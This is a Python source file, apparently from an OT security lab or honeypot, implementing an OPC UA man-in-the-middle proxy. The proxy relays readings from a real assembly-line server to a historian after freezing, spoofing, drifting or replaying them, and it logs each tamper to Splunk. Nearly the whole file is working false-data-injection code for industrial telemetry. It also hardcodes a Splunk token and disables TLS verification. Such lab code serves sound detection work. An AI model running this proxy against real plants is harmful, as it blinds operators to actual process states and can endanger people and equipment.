"""
OPC UA Semantic MITM Proxy
==========================
Architecture
------------
  historian_ingest  -->  [this OPC UA server, port 4841]
                              |  reads real values
                         [real opcua_server:4840]
                              |  applies attack transform
                         serves TAMPERED values to historian

The historian client never connects to the real server. It connects here
and receives whatever values this proxy decides to give it — frozen,
spoofed, drifted, or replayed — depending on ATTACK_MODE.

Environment variables
---------------------
LISTEN_ENDPOINT    OPC UA endpoint to expose to historian   (default 0.0.0.0:4841)
TARGET_URL         real OPC UA server URL                   (default opcua_server:4840)
NAMESPACE          shared namespace URI

ATTACK_MODE — one of:
  none     transparent relay, values pass through unchanged (baseline)
  freeze   relay normally for FREEZE_AFTER_TICKS polls,
           then lock values at last-good reading         → triggers stuck_value_pattern
  spoof    always report a convincing "line is running fine" signal
           regardless of what the real process is doing  → false data injection
  drift    add DRIFT_RATE m/min per poll to reported speed
           while temp stays coupled to reality           → triggers cross_signal_mismatch
  replay   capture first REPLAY_BUFFER_SIZE real readings,
           then loop through them forever                → historian sees stale/cyclic data

FREEZE_AFTER_TICKS   polls before freeze activates         (default 8)
DRIFT_RATE           m/min offset added per poll           (default 0.12)
REPLAY_BUFFER_SIZE   samples to capture before looping     (default 20)
POLL_INTERVAL        seconds between upstream reads        (default 3.0)
"""

import asyncio
import math
import os
import random
import time
import urllib3

import requests
from asyncua import Server, Client, ua

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
LISTEN_ENDPOINT    = os.getenv("LISTEN_ENDPOINT",   "opc.tcp://0.0.0.0:4841/freeopcua/server/")
TARGET_URL         = os.getenv("TARGET_URL",         "opc.tcp://opcua_server:4840/freeopcua/server/")
NAMESPACE          = os.getenv("NAMESPACE",          "http://manufacturing.example/opcua")
ATTACK_MODE        = os.getenv("ATTACK_MODE",        "none")
FREEZE_AFTER_TICKS = int(os.getenv("FREEZE_AFTER_TICKS",  "8"))
DRIFT_RATE         = float(os.getenv("DRIFT_RATE",        "0.12"))
REPLAY_BUFFER_SIZE = int(os.getenv("REPLAY_BUFFER_SIZE",  "20"))
POLL_INTERVAL      = float(os.getenv("POLL_INTERVAL",     "3.0"))
SPLUNK_HEC_URL     = os.getenv("SPLUNK_HEC_URL",   "https://localhost:8088/services/collector/event")
SPLUNK_HEC_TOKEN   = os.getenv("SPLUNK_HEC_TOKEN",  "b564be39-fbf1-4a54-83c4-53c5017bfc1f")

TAGS = [
    "line1_conveyor_speed_mpm",
    "weld_cell_temperature_c",
    "robot_arm_3_cycle_count",
]


# ---------------------------------------------------------------------------
# Splunk HEC helper
# ---------------------------------------------------------------------------
def send_to_splunk(real: dict, tampered: dict, tick: int) -> None:
    """Send one MITM tamper record to Splunk for every poll where values were modified."""
    divergences = {
        tag: {"real": real.get(tag), "sent": tampered.get(tag)}
        for tag in TAGS
        if round(real.get(tag, 0), 3) != round(tampered.get(tag, 0), 3)
    }
    event = {
        "timestamp":   time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "asset":       "opcua_historian_link",
        "zone":        "L2_L3_boundary",
        "event_type":  "mitm_tamper",
        "attack_mode": ATTACK_MODE,
        "tick":        tick,
        "tampered":    bool(divergences),
        "divergences": divergences,
        "real_speed":  real.get("line1_conveyor_speed_mpm"),
        "sent_speed":  tampered.get("line1_conveyor_speed_mpm"),
        "real_temp":   real.get("weld_cell_temperature_c"),
        "sent_temp":   tampered.get("weld_cell_temperature_c"),
    }
    payload = {
        "event":      event,
        "sourcetype": "ot:mitm_tamper",
        "index":      "ot_honeypot",
    }
    headers = {
        "Authorization":            f"Splunk {SPLUNK_HEC_TOKEN}",
        "X-Splunk-Request-Channel": "mitm-proxy-channel",
    }
    try:
        r = requests.post(SPLUNK_HEC_URL, headers=headers,
                          json=payload, verify=False, timeout=4)
        if r.status_code != 200:
            print(f"[splunk] http={r.status_code} {r.text[:120]}")
    except Exception as exc:
        print(f"[splunk] send failed: {exc}")


# ---------------------------------------------------------------------------
# Attack engine — pure transform, no I/O
# ---------------------------------------------------------------------------
class AttackEngine:
    def __init__(self, mode: str):
        self.mode = mode
        self.tick = 0
        self._frozen_snapshot: dict[str, float] = {}
        self._replay_buf: list[dict[str, float]] = []
        self._drift_acc = 0.0
        print(f"[MITM] attack_mode={mode!r}  target={TARGET_URL}")

    @staticmethod
    def _noise(sigma: float = 0.08) -> float:
        return random.gauss(0, sigma)

    def transform(self, real: dict[str, float]) -> dict[str, float]:
        self.tick += 1

        if self.mode == "none":
            return dict(real)

        # ------------------------------------------------------------------
        elif self.mode == "freeze":
            if self.tick <= FREEZE_AFTER_TICKS:
                self._frozen_snapshot = dict(real)
                return dict(real)
            if self.tick == FREEZE_AFTER_TICKS + 1:
                print(f"[MITM] freeze activated  snapshot={self._frozen_snapshot}")
            # Replay snapshot with micro-noise so it is not perfectly flat,
            # but the ingestor's unchanged_count will still increment
            return {k: round(v + self._noise(0.015), 3) for k, v in self._frozen_snapshot.items()}

        # ------------------------------------------------------------------
        elif self.mode == "spoof":
            # Return a convincingly "normal" signal with the same gentle sinusoid
            # as the real server uses, so it looks live. The real line may be IDLE
            # or in MAINTENANCE — historian never knows.
            t = float(self.tick)
            pi = math.pi
            spoofed: dict[str, float] = {
                "line1_conveyor_speed_mpm": round(
                    20.5 + 0.6 * math.sin(2 * pi * t / 20) + self._noise(0.07), 2),
                "weld_cell_temperature_c": round(
                    72.0 + 2.0 * math.sin(2 * pi * t / 30) + self._noise(0.10), 2),
                # Cycles must still increment convincingly
                "robot_arm_3_cycle_count": round(
                    real.get("robot_arm_3_cycle_count", 5000) + random.randint(1, 2), 0),
            }
            real_speed = real.get("line1_conveyor_speed_mpm", 0.0)
            if abs(real_speed - spoofed["line1_conveyor_speed_mpm"]) > 3.0:
                print(
                    f"[MITM] spoof divergence  real={real_speed:.2f}  "
                    f"reported={spoofed['line1_conveyor_speed_mpm']:.2f}"
                )
            return spoofed

        # ------------------------------------------------------------------
        elif self.mode == "drift":
            # Speed climbs steadily; temp stays tied to reality.
            # Once speed > ~8 m/min with cycles not advancing proportionally
            # the cross_signal_mismatch detector fires in the historian ingestor.
            self._drift_acc += DRIFT_RATE
            drifted = dict(real)
            drifted["line1_conveyor_speed_mpm"] = round(
                min(29.9, real["line1_conveyor_speed_mpm"] + self._drift_acc + self._noise(0.05)), 2)
            if self.tick % 10 == 0:
                print(
                    f"[MITM] drift  tick={self.tick}  "
                    f"offset={self._drift_acc:.2f}  "
                    f"reported_speed={drifted['line1_conveyor_speed_mpm']:.2f}"
                )
            return drifted

        # ------------------------------------------------------------------
        elif self.mode == "replay":
            if len(self._replay_buf) < REPLAY_BUFFER_SIZE:
                self._replay_buf.append(dict(real))
                return dict(real)
            if self.tick == REPLAY_BUFFER_SIZE + 1:
                print(f"[MITM] replay loop started  buffer={REPLAY_BUFFER_SIZE}")
            idx = (self.tick - REPLAY_BUFFER_SIZE) % REPLAY_BUFFER_SIZE
            return {k: round(v + self._noise(0.02), 3) for k, v in self._replay_buf[idx].items()}

        return dict(real)


# ---------------------------------------------------------------------------
# OPC UA relay
# ---------------------------------------------------------------------------
async def _poll_and_relay(engine: AttackEngine, mirror_nodes: dict):
    """Read one sample from real server, tamper it, push to mirror nodes."""
    async with Client(url=TARGET_URL) as real_client:
        real_idx = await real_client.get_namespace_index(NAMESPACE)
        real_values: dict[str, float] = {}
        for tag in TAGS:
            node = await real_client.nodes.root.get_child(
                ["0:Objects", f"{real_idx}:AssemblyLine", f"{real_idx}:{tag}"]
            )
            real_values[tag] = float(await node.read_value())

    tampered = engine.transform(real_values)

    for tag, mirror_node in mirror_nodes.items():
        val = tampered.get(tag, real_values.get(tag, 0.0))
        await mirror_node.write_value(
            ua.DataValue(ua.Variant(float(val), ua.VariantType.Double))
        )

    send_to_splunk(real_values, tampered, engine.tick)

    print(
        f"[MITM] tick={engine.tick}  mode={ATTACK_MODE}  "
        f"real_spd={real_values.get('line1_conveyor_speed_mpm', 0):.2f}  "
        f"sent_spd={tampered.get('line1_conveyor_speed_mpm', 0):.2f}  "
        f"real_tmp={real_values.get('weld_cell_temperature_c', 0):.2f}  "
        f"sent_tmp={tampered.get('weld_cell_temperature_c', 0):.2f}"
    )


async def run():
    engine = AttackEngine(ATTACK_MODE)

    # Stand up mirror OPC UA server that historian ingest will connect to
    mirror = Server()
    await mirror.init()
    mirror.set_endpoint(LISTEN_ENDPOINT)
    idx = await mirror.register_namespace(NAMESPACE)

    assembly = await mirror.nodes.objects.add_object(idx, "AssemblyLine")
    mirror_nodes: dict[str, object] = {}
    for tag in TAGS:
        node = await assembly.add_variable(idx, tag, 0.0)
        await node.set_writable()
        mirror_nodes[tag] = node

    print(f"[MITM] mirror OPC UA server ready  {LISTEN_ENDPOINT}")

    async with mirror:
        while True:
            try:
                await _poll_and_relay(engine, mirror_nodes)
            except Exception as exc:
                print(f"[MITM] upstream error: {exc}  retrying in {POLL_INTERVAL}s")
            await asyncio.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    asyncio.run(run())
